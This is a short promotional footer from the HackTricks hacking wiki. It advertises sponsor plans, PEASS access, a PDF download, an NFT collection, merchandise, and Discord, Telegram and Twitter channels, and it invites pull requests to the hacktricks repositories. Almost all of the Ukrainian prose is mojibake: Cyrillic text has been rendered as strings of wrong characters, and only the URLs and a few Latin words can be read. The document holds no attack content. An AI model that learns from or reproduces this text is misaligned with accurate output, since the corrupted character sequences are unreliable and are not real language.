* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É—î—Ç—å—Å—è –Ω–∞ HackTricks**? –∞–±–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
